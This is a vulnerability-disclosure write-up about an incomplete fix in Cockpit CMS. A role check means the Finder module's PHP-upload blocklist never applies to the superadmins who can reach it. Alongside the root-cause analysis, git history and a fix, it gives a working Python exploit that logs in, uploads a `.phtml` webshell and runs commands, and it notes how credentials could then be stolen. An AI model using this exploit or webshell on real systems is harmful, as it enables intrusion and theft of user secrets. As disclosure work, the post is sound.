---
title: "A Guard That Can Never Fire: Authenticated RCE in Cockpit CMS's Finder Module"
date: 2026-11-07
author: "Angus Dawson"
tags: ["Vulnerability Research","RCE","PHP","Cockpit CMS","CVE","Incomplete Fix","File Upload","CWE-434"]
categories: ["Vulnerability Research"]
description: "An incomplete fix for CVE-2025-1025, still unpatched in the latest release"
summary: "Cockpit CMS's Finder module blocks PHP uploads only for non-superadmins, but the whole module is superadmin-only, so the check never fires. An incomplete fix for CVE-2025-1025 that gives any superadmin code execution, still unpatched in 2.14.1."
cover:
  image: "/images/cockpit/poc-success.png"
  alt: "PoC: authenticated upload and command execution as www-data"
  hidden: true
---

> **TL;DR:** Cockpit CMS's Finder module has a file-extension blocklist meant to stop PHP files
> being uploaded to the web root. The check only applies when `!isSuperAdmin()`, but the whole
> module is restricted to superadmins, so it never runs for anyone who can reach it. Any superadmin
> (including the default `admin` account) can upload a `.phtml` shell and get code execution. It's an
> incomplete fix for CVE-2025-1025, present since v2.3.3 and still in the current release (2.14.1)
> at the time of writing.
>
> **Severity:** High, CVSS 3.1 7.2 (`AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`) · **CWE-434**

## Why I was poking at this

Lately my favourite bugs are old ones that were only half fixed. When a project ships a security
fix, the changelog says "fixed", scanners mark the CVE remediated, and everyone moves on. If the same
dangerous pattern lives in two places and only one gets patched, the other one is still exploitable
and nobody is looking at it anymore.

So I went looking at CVE-2025-1025, an arbitrary file upload in [Cockpit
CMS](https://github.com/Cockpit-HQ/Cockpit) that was fixed in v2.4.1. I already knew what the bug
was. What I wanted to know was whether they had fixed it everywhere.

Cockpit has more than one way to put a file on disk. The Assets module is the obvious one, but there's
also the Finder module, a file-manager-style interface. Two upload paths and one fix, so Finder is
where I started reading.

## The check that looks fine

Here's the Finder module's extension guard, in `modules/Finder/Controller/Finder.php`:

```php
// Finder.php:524
protected function _isFileTypeAllowed($file) {

    $allowed = \trim($this->app->retrieve('finder.allowed_uploads', '*'));

    // Line 528
    if (\in_array(\strtolower(\pathinfo($file, PATHINFO_EXTENSION)), ['php', 'phar', 'phtml'])
        && !$this->helper('acl')->isSuperAdmin()) {
        return false;
    }

    if ($allowed == '*') {
        return true;
    }
    // ...
}
```

At a glance it's a reasonable blocklist: if the extension is `php`, `phar` or `phtml`, reject it.

The second half of the condition is `&& !$this->helper('acl')->isSuperAdmin()`, so the rejection only
happens for users who are not superadmins. That could be deliberate. Maybe superadmins are trusted
with dangerous uploads and the check exists to stop lower-privileged users.

That isn't how the Finder module works, though.

## The gate in front of it

Every request into the Finder controller passes through `before()`:

```php
// Finder.php:14
protected function before() {
    if (!$this->helper('acl')->isSuperAdmin() || !$this->helper('spaces')->isMaster()) {
        return $this->stop(401); // Non-superadmins cannot enter Finder
    }
}
```

The entire module is superadmin-only. Non-superadmins get a `401` before they can do anything.

Put the two pieces together:

- The users who can **reach** `_isFileTypeAllowed()` are superadmins.
- The users the extension check **blocks** are non-superadmins.

Those two groups don't overlap. The guard blocks exactly the people who were already turned away one
layer up, and lets through exactly the people who can use the feature, so the blocklist never fires
for anyone who hits it.

That's the whole bug. A superadmin can upload a `.phtml` file straight into a web-served directory,
browse to it, and run code.

## Git archaeology: how it got this way

I wanted to know where the `!isSuperAdmin()` came from, so I ran `git log -L` on the line. The
timeline is almost too neat:

| Commit | Date | Release | What happened to this line |
|---|---|---|---|
| `c13f8e47` | 2022-10-31 | **2.3.3** | Finder module added "only for super admin users." The check ships as `pathinfo(...) == 'php' && !isSuperAdmin()`, so the exception is there from day one. |
| `984ef9ad` | 2023-03-17 | **2.4.1** | The CVE-2025-1025 fix. It broadens the blocklist from `== 'php'` to `in_array(..., ['php','phar','phtml'])` on this exact line, but keeps the `&& !isSuperAdmin()` clause. The Assets module got the same fix with no role exception. |
| `5909344a` | 2026-01-01 | 2.14.x | Cosmetic namespace prefixing only. |

The guard never did anything, right from 2022. When the security fix landed in 2023, the developer
edited this very line to widen the blocklist and left in the clause that cancels it out. The Assets
module, fixing the same class of bug, got it right:

```php
// modules/Assets/bootstrap.php — the correct, unconditional fix
$forbiddenExtension = ['bat', 'exe', 'sh', 'php', 'phar', 'phtml',
                       'phps', 'htm', 'html', 'xhtml', 'htaccess'];
// Enforced for ALL users — no isSuperAdmin() exception
```

Assets is safe. Finder has been exploitable the entire time.

## Proving it

The Finder upload API takes a multipart POST. Authenticate as `admin`, grab the session CSRF token,
and upload a webshell with a `.phtml` extension:

```python
import requests, re

BASE = "http://TARGET:PORT"
s = requests.Session()

# login + csrf
csrf = re.search(r'csrf:\s*["\']([^"\']+)["\']', s.get(f"{BASE}/auth/login").text).group(1)
sess_csrf = s.post(f"{BASE}/auth/check",
    headers={"Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest"},
    json={"auth": {"user": "admin", "password": "PASSWORD"}, "csrf": csrf}).json()["csrf"]

# upload the shell via Finder
shell = b"<?php echo shell_exec($_GET['c']); ?>"
r = s.post(f"{BASE}/finder/api",
    headers={"X-Requested-With": "XMLHttpRequest", "X-CSRF-TOKEN": sess_csrf,
             "Origin": BASE, "Referer": f"{BASE}/finder"},
    data={"root": "#root:", "cmd": "upload", "path": "/"},
    files={"files[]": ("shell.phtml", shell, "text/plain")})
print("Upload:", r.json())

# run a command
print("RCE:", s.get(f"{BASE}/shell.phtml", params={"c": "id"}).text.strip())
```

![PoC: authenticated upload and command execution as www-data](/images/cockpit/poc-success.png)

The upload response gives it away: `{"uploaded":["shell.phtml"],"failed":[]}`. The Finder handler
sorts each file into `uploaded` or `failed`, and a rejected extension would land in `failed`. Here
`failed` is empty and the shell is in `uploaded`. Then `id` comes back as `uid=33(www-data)`, which is
arbitrary command execution as the web server user.

A grep of the deployed source shows the three role-gated guards in Finder, plus the in-source comment
saying the `admin` role is the superadmin role:

![Source grep showing the role-gated guards and the admin=superadmin comment](/images/cockpit/grep_superadmin.png)

### A second instance, for free

While confirming the first bug I found the same mistake a few hundred lines up, on the file-write path
rather than the upload path:

```php
// Finder.php ~318
$isPHPfile = \preg_match('/\.php$/', $file);
if ($isPHPfile && !$this->helper('acl')->isSuperAdmin()) {
    return ['success' => false, 'error' => 'Access denied.'];
}
$ret = \file_put_contents($file, $contents);
```

The logic is the same, so a superadmin can write arbitrary PHP source straight into a `.php` file.
That's an even more direct route to execution and doesn't need the `.phtml` trick.

## Why it matters even though it needs admin

The obvious objection is that it requires a superadmin, and admins are trusted. I don't think that
holds here, for two reasons.

First, a superadmin in Cockpit is an application role, not a shell account. This bug turns that role
into OS-level code execution as `www-data`, which is well beyond what the admin UI is supposed to
grant. From there you can read the application's SQLite store and take every user's bcrypt hash, TOTP
secret and API key, then persist or pivot:

![Querying the Cockpit user store: the default account's role and username are both "admin"](/images/cockpit/sqlite3_admin.png)

Second, and more important, the project has already decided that blocking PHP uploads applies to
privileged users too. That's what the CVE-2025-1025 fix was, and it's what the Assets module does
today. Finder ships the same control and it doesn't work.

On scoring, I went with CVSS 3.1 7.2, Scope: Unchanged (`AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`). You
could argue for Scope: Changed, since the impact crosses from the app role to the OS, and that would
push it into the 9s. I scored it conservatively, in line with how comparable Cockpit RCEs have been
rated. High is a fair label for an admin-gated RCE.

## The fix

It's one line. Drop the role exception so the blocklist applies to everyone who reaches it, as Assets
already does:

```php
// instead of: ... ['php','phar','phtml']) && !$this->helper('acl')->isSuperAdmin()
if (\in_array(\strtolower(\pathinfo($file, PATHINFO_EXTENSION)),
              ['php', 'phar', 'phtml', 'phps', 'pht'])) {
    return false;
}
```

The file-write guard at ~line 318 needs the same change. For defence in depth, serve the Finder upload
directory from outside the web root and add an Apache `FilesMatch` deny for
`\.ph(p[2-9]?|tml|ar|t|ps)$`.

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-08-08 | Reported privately to security@getcockpit.com (the contact in SECURITY.md), with full PoC and root-cause analysis. |
| 2026-08-26 | Vendor ships 2.14.1, a security release that hardens a different upload path (bucket/Assets) but does not touch the Finder check. |
| 2026-11-06 | 90-day coordinated-disclosure window elapses. No acknowledgement received. |
| 2026-11-07 | Public disclosure. The issue remains unfixed in the latest source (2.14.1). |

I gave this the full 90 days and would much rather have coordinated a fix. The window has passed with
no response, so I'm publishing. The fix is a one-line change the project has already written for its
other module.

## Things to remember

- **Check that a fix was applied everywhere.** After a patch, I now ask whether it covers every place
  the pattern lives, as well as whether it's correct. Two sibling code paths with one fix is a shape
  I keep seeing.
- **A guard that can't fire is as good as no guard.** The check was present; its condition just could
  never be true. Bugs like this survive review because the code looks like it's doing the right thing.
- **`git log -L` is underrated.** Tracing the line's history showed when the bug was introduced and why
  the fix missed it. That makes a report much harder for a vendor to wave away.

*Found something wrong here, or want to talk shop? I'm [@basil9099 on GitHub](https://github.com/basil9099).*
